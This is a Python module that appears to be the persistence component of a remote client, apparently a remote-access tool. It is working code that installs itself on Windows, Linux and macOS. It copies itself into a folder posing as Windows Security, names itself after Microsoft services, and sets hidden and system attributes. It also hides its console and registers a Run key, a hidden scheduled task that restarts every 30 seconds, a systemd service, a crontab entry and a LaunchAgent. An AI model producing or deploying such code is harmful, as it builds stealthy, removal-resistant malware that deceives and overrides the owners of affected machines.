"""
Cross-platform persistence — ensures the client auto-starts on system boot
and is resilient against being killed or having its file deleted.

Windows strategy (layered, no admin required):
  1. Copy exe to %APPDATA%\\Microsoft\\Windows\\SecurityHealth\\  (disguised location)
  2. Set file hidden + system attributes
  3. Registry HKCU Run key  → auto-start on login
  4. Task Scheduler via PowerShell with RestartOnFailure every 30s
     → auto-restart if killed from Task Manager

Linux:  systemd user service (Restart=always) + crontab fallback
macOS:  LaunchAgent plist (KeepAlive=true)
"""
from __future__ import annotations
import logging
import os
import shutil
import sys
from pathlib import Path

log = logging.getLogger(__name__)

APP_NAME  = "SecurityHealthService"
APP_ID    = "com.microsoft.windows.securityhealth"
TASK_NAME = "MicrosoftSecurityHealthService"


# ── Public API ─────────────────────────────────────────────────────────────

def install() -> bool:
    if sys.platform == "win32":
        return _install_windows()
    elif sys.platform == "linux":
        return _install_linux()
    elif sys.platform == "darwin":
        return _install_macos()
    log.warning("Persistence not supported on platform: %s", sys.platform)
    return False


def uninstall() -> bool:
    if sys.platform == "win32":
        return _uninstall_windows()
    elif sys.platform == "linux":
        return _uninstall_linux()
    elif sys.platform == "darwin":
        return _uninstall_macos()
    return False


def is_installed() -> bool:
    if sys.platform == "win32":
        return _check_windows()
    elif sys.platform == "linux":
        return _check_linux()
    elif sys.platform == "darwin":
        return _check_macos()
    return False


def hide_console() -> None:
    """Silently hide the console window on Windows."""
    if sys.platform != "win32":
        return
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except Exception:
        pass


# ── Windows ────────────────────────────────────────────────────────────────

def _install_path() -> Path:
    """
    Return a disguised install location inside AppData.
    Looks identical to a real Windows Security component.
    """
    appdata = os.environ.get("APPDATA", "")
    if appdata:
        d = Path(appdata) / "Microsoft" / "Windows" / "SecurityHealth"
        d.mkdir(parents=True, exist_ok=True)
        return d / f"{APP_NAME}.exe"
    return Path(sys.executable)


def _maybe_relocate() -> Path:
    """
    If running as a frozen exe NOT already in the disguised location,
    copy the exe AND the client/ config folder there.
    Returns the install path.
    """
    if not getattr(sys, "frozen", False):
        return Path(sys.executable)

    install = _install_path()
    current = Path(sys.executable).resolve()

    if current != install.resolve():
        try:
            shutil.copy2(str(current), str(install))
            _set_hidden(install)
            log.info("Relocated exe to %s", install)
        except Exception as exc:
            log.warning("Relocation failed: %s", exc)
            return current

    # Always ensure config folder exists at install location
    # (covers both first-time relocation and the case where it was missing)
    _copy_config_folder(current.parent, install.parent)

    return install


def _copy_config_folder(src_dir: Path, dst_dir: Path) -> None:
    """Copy the client/ subfolder (config.yaml etc.) next to the relocated exe."""
    src_client = src_dir / "client"
    dst_client = dst_dir / "client"
    if not src_client.exists():
        log.warning("client/ folder not found at %s — config will be missing", src_dir)
        return
    try:
        dst_client.mkdir(parents=True, exist_ok=True)
        for item in src_client.iterdir():
            dest = dst_client / item.name
            if item.is_file():
                shutil.copy2(str(item), str(dest))
        log.info("Copied client/ config folder to %s", dst_client)
    except Exception as exc:
        log.warning("Failed to copy config folder: %s", exc)


def _set_hidden(path: Path) -> None:
    """Set Hidden + System file attributes so Explorer hides the file."""
    try:
        import subprocess
        subprocess.run(
            ["attrib", "+h", "+s", str(path)],
            capture_output=True, timeout=5
        )
    except Exception:
        pass


def _exe_cmd() -> str:
    """Command string to use in Registry / Task Scheduler."""
    if getattr(sys, "frozen", False):
        return str(_maybe_relocate())
    return f'"{sys.executable}" "{Path(sys.argv[0]).resolve()}"'


def _install_windows() -> bool:
    exe = _exe_cmd()
    ok = False

    # ── Layer 1: Registry Run key ──────────────────────────────────────────
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path,
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, exe)
        log.info("Registry Run key installed")
        ok = True
    except Exception as exc:
        log.warning("Registry persistence failed: %s", exc)

    # ── Layer 2: Task Scheduler with RestartOnFailure (PowerShell) ─────────
    ok = _schtasks_powershell(exe) or ok

    return ok


def _schtasks_powershell(exe: str) -> bool:
    """
    Create a scheduled task that:
    - Runs at logon
    - Restarts automatically every 30s if the process exits/is killed
    - Runs with highest available privileges (no UAC needed for HKCU)
    """
    import subprocess
    ps = (
        f"$a = New-ScheduledTaskAction -Execute '{exe}';"
        "$t = New-ScheduledTaskTrigger -AtLogOn;"
        "$s = New-ScheduledTaskSettingsSet "
        "  -RestartCount 9999 "
        "  -RestartInterval (New-TimeSpan -Seconds 30) "
        "  -ExecutionTimeLimit ([TimeSpan]::Zero) "
        "  -MultipleInstances IgnoreNew "
        "  -Hidden;"
        f"Register-ScheduledTask -TaskName '{TASK_NAME}' "
        "-Action $a -Trigger $t -Settings $s -RunLevel Highest -Force | Out-Null"
    )
    try:
        result = subprocess.run(
            ["powershell", "-NonInteractive", "-WindowStyle", "Hidden",
             "-Command", ps],
            capture_output=True, text=True, timeout=15,
            creationflags=0x08000000 if sys.platform == "win32" else 0,
        )
        if result.returncode == 0:
            log.info("Task Scheduler (RestartOnFailure) installed")
            return True
        log.warning("PowerShell task failed: %s", result.stderr.strip()[:200])
        # fallback to basic schtasks
        return _schtasks_basic(exe)
    except Exception as exc:
        log.warning("PowerShell persistence failed: %s — trying schtasks", exc)
        return _schtasks_basic(exe)


def _schtasks_basic(exe: str) -> bool:
    import subprocess
    try:
        r = subprocess.run(
            ["schtasks", "/create", "/tn", TASK_NAME,
             "/tr", exe, "/sc", "ONLOGON", "/rl", "HIGHEST", "/f"],
            capture_output=True, text=True, timeout=10,
        )
        if r.returncode == 0:
            log.info("Basic Task Scheduler entry created")
            return True
        log.warning("schtasks basic failed: %s", r.stderr.strip())
    except Exception as exc:
        log.warning("schtasks failed: %s", exc)
    return False


def _uninstall_windows() -> bool:
    import subprocess
    # Registry
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, APP_NAME)
    except FileNotFoundError:
        pass
    except Exception as exc:
        log.warning("Registry removal failed: %s", exc)

    # Task Scheduler
    try:
        subprocess.run(["schtasks", "/delete", "/tn", TASK_NAME, "/f"],
                       capture_output=True, timeout=10)
    except Exception:
        pass

    # Remove relocated exe
    try:
        install = _install_path()
        if install.exists():
            # Remove hidden+system before delete
            subprocess.run(["attrib", "-h", "-s", str(install)],
                           capture_output=True, timeout=5)
            install.unlink()
    except Exception:
        pass

    return True


def _check_windows() -> bool:
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run") as k:
            winreg.QueryValueEx(k, APP_NAME)
        return True
    except Exception:
        return False


# ── Linux ──────────────────────────────────────────────────────────────────

def _install_linux() -> bool:
    exe = (
        str(Path(sys.executable).resolve())
        if getattr(sys, "frozen", False)
        else f'"{sys.executable}" "{Path(sys.argv[0]).resolve()}"'
    )
    service_dir = Path.home() / ".config" / "systemd" / "user"
    service_file = service_dir / f"{APP_ID}.service"

    content = (
        "[Unit]\n"
        "Description=MARS Client Service\n"
        "After=network.target\n\n"
        "[Service]\n"
        "Type=simple\n"
        f"ExecStart={exe}\n"
        "Restart=always\n"
        "RestartSec=15\n\n"
        "[Install]\n"
        "WantedBy=default.target\n"
    )
    try:
        service_dir.mkdir(parents=True, exist_ok=True)
        service_file.write_text(content)
        import subprocess
        subprocess.run(["systemctl", "--user", "daemon-reload"], timeout=10)
        subprocess.run(["systemctl", "--user", "enable", "--now",
                        f"{APP_ID}.service"], timeout=10)
        log.info("systemd user service installed")
        return True
    except Exception as exc:
        log.warning("systemd failed: %s — trying crontab", exc)
        return _crontab_install(exe)


def _crontab_install(exe: str) -> bool:
    import subprocess
    entry = f"@reboot {exe}"
    try:
        cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
        if entry not in cur:
            proc = subprocess.run(["crontab", "-"],
                                  input=cur.rstrip("\n") + f"\n{entry}\n",
                                  text=True, capture_output=True, timeout=10)
            if proc.returncode != 0:
                return False
        log.info("crontab @reboot installed")
        return True
    except Exception as exc:
        log.warning("crontab failed: %s", exc)
        return False


def _uninstall_linux() -> bool:
    sf = Path.home() / ".config" / "systemd" / "user" / f"{APP_ID}.service"
    try:
        import subprocess
        subprocess.run(["systemctl", "--user", "disable", "--now",
                        f"{APP_ID}.service"], capture_output=True, timeout=10)
        sf.unlink(missing_ok=True)
    except Exception:
        pass
    return True


def _check_linux() -> bool:
    return (Path.home() / ".config" / "systemd" / "user" / f"{APP_ID}.service").exists()


# ── macOS ──────────────────────────────────────────────────────────────────

def _install_macos() -> bool:
    agents = Path.home() / "Library" / "LaunchAgents"
    plist = agents / f"{APP_ID}.plist"
    exe = (
        str(Path(sys.executable).resolve())
        if getattr(sys, "frozen", False)
        else sys.executable
    )
    content = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"\n'
        '  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
        '<plist version="1.0"><dict>\n'
        f'  <key>Label</key><string>{APP_ID}</string>\n'
        '  <key>ProgramArguments</key>\n'
        f'  <array><string>{exe}</string></array>\n'
        '  <key>RunAtLoad</key><true/>\n'
        '  <key>KeepAlive</key><true/>\n'
        '</dict></plist>\n'
    )
    try:
        agents.mkdir(parents=True, exist_ok=True)
        plist.write_text(content)
        import subprocess
        subprocess.run(["launchctl", "load", "-w", str(plist)], timeout=10)
        log.info("LaunchAgent installed")
        return True
    except Exception as exc:
        log.warning("LaunchAgent failed: %s", exc)
        return False


def _uninstall_macos() -> bool:
    plist = Path.home() / "Library" / "LaunchAgents" / f"{APP_ID}.plist"
    try:
        import subprocess
        subprocess.run(["launchctl", "unload", str(plist)],
                       capture_output=True, timeout=10)
        plist.unlink(missing_ok=True)
    except Exception:
        pass
    return True


def _check_macos() -> bool:
    return (Path.home() / "Library" / "LaunchAgents" / f"{APP_ID}.plist").exists()
